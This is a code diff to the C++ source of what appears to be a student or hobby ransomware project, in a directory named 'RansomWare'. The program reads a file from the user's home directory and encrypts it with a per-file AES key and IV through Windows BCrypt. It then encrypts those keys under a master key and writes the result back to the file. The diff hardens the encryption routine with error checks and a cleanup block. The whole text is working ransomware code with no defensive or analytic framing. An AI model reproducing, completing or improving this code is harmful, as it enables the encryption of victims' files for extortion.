@@ -30,7 +30,7 @@ int main(int argc, char* argv[]) {
 
 	
 #ifdef DEBUG
-	string path = "C:\\Programming\\RansomWare\\236499\\test\\rans.txt";
+	string path = "C:\\rans\\236499\\Squanched\\Debug\\rans.txt";
 #else
 	string path = get_home();
 #endif
@@ -89,11 +89,19 @@ DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key)
 	return status;
 }
 
-void initPlainText(string path, PBYTE *buffer, size_t buffSize)
+bool initPlainText(string path, PBYTE *buffer, size_t buffSize)
 {
 	std::ifstream plaintextFile;
 	plaintextFile.open(path, std::ios::binary);
+	if (!plaintextFile.is_open()) {
+		return false;
+	}
 	*buffer = new BYTE[buffSize + 1];
+	if(nullptr == *buffer) {
+		plaintextFile.close();
+		return false;
+	}
+		
 	char c;
 	for (size_t i = 0; i < buffSize; ++i) {
 		plaintextFile.get(c);
@@ -101,6 +109,7 @@ void initPlainText(string path, PBYTE *buffer, size_t buffSize)
 	}
 	(*buffer)[buffSize] = '\0';
 	plaintextFile.close();
+	return true;
 }
 
 void writeToFile(string path, PBYTE cipherText, DWORD cipherLen, PBYTE keyIV, size_t plainTextSize)
@@ -146,17 +155,26 @@ DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& a
 void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
 {
 	DWORD status;
-	PBYTE plainText = NULL;
+	PBYTE plainText = nullptr;
 	size_t plainTextLen = getFileSize(path);
 	
-	initPlainText(path, &plainText, plainTextLen);
+	PBYTE iv = nullptr;
+	PBYTE key = nullptr;
 
-	PBYTE iv =  (PBYTE)HeapAlloc(GetProcessHeap(),0,IV_LEN);
-	PBYTE key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
+	BCRYPT_ALG_HANDLE aesHandle = nullptr;
+	BCRYPT_KEY_HANDLE keyHandle = nullptr;
+
+	PBYTE cipherText = nullptr;
+	if(!initPlainText(path, &plainText, plainTextLen)) {
+		goto CLEANUP;
+	}
+
+	iv =  (PBYTE)HeapAlloc(GetProcessHeap(),0,IV_LEN);
+	key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
 
 	status = generateKeyAndIV(&iv, &key);
 	if(!NT_SUCCESS(status)) {
-		//TODO cleanup
+		goto CLEANUP;
 		std::cout << "key and IV set FAIL";//TODO remove if doesn't show
 	}
 	//keep in persistant file
@@ -169,31 +187,30 @@ void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
 	std::cout << "PALINTEXT LEN : \t\t" << plainTextLen << std::endl;
 	std::cout << "Plaintext:\t" <<(char*) plainText << std::endl;
 #endif
-	BCRYPT_ALG_HANDLE aesHandle = nullptr;
-	BCRYPT_KEY_HANDLE keyHandle;
+	
 	status = getKeyHandle(key, keyHandle, aesHandle);
 	if (!NT_SUCCESS(status)) {
-		//TODO cleanup
+		goto CLEANUP;
 	}
 	DWORD cipherSize,resSize;
 	//CHECK IF NEEDED V
 	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
 	if(NULL == tmpIv) {
-		//cleanup
+		goto CLEANUP;
 	}
 	memcpy(tmpIv, iv, IV_LEN);
 	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, NULL, 0, &cipherSize, BCRYPT_BLOCK_PADDING);
 	if (!NT_SUCCESS(status)) {
-		//TODO cleanup
+		goto CLEANUP;
 	}
 
-	PBYTE cipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
+	cipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
 	if(NULL == cipherText) {
-		//cleanup
+		goto CLEANUP;
 	}
 	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, cipherText, cipherSize, &resSize, BCRYPT_BLOCK_PADDING);
 	if (!NT_SUCCESS(status)) {
-		//TODO cleanup
+		goto CLEANUP;
 	}
 #ifdef DEBUG
 	std::cout << "Ciphertext:\t" << cipherText << std::endl;
@@ -216,8 +233,19 @@ void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
 	status = encryptKeyIV(keyIV, &keyIVBuff, masterKey, masterIV);
 	writeToFile(path, cipherText, cipherSize, keyIVBuff, plainTextLen);
 	
-	//TODO CLEANUP!!!!!
-	delete plainText;
+CLEANUP:
+	if(plainText)
+		delete plainText;
+	if (iv)
+		HeapFree(GetProcessHeap(), 0, iv);
+	if (key)
+		HeapFree(GetProcessHeap(), 0, key);
+	if (aesHandle)
+		BCryptCloseAlgorithmProvider(aesHandle, 0);
+	if (keyHandle)
+		BCryptDestroyKey(keyHandle);
+	if (cipherText)
+		HeapFree(GetProcessHeap(), 0, cipherText);
 }
 
 
